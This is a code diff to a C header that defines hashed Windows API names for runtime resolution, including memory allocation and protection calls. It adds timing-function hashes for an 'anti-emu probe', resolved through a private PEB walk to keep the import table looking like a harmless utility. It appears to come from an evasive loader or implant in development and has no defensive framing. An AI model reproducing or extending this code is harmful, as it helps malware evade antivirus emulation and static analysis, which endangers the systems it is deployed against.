@@ -70,4 +70,10 @@ static inline uint32_t djb2i_wide(const uint16_t *s, size_t max_chars) {
 #define H_NT_ALLOC_VM        0x83ffec22u  /* NtAllocateVirtualMemory */
 #define H_NT_PROTECT_VM      0x10a4db54u  /* NtProtectVirtualMemory  */
 
+/* kernel32 exports used by the S40 anti-emu probe. Resolved through a
+ * private PEB walk inside anti_emu.c so the IAT silhouette stays at
+ * the S39 12-entry common-utility set. */
+#define H_QUERYPERFORMANCECOUNTER   0x0e98c4c3u
+#define H_QUERYPERFORMANCEFREQUENCY 0x52fdbe73u
+
 #endif /* HASH_H */
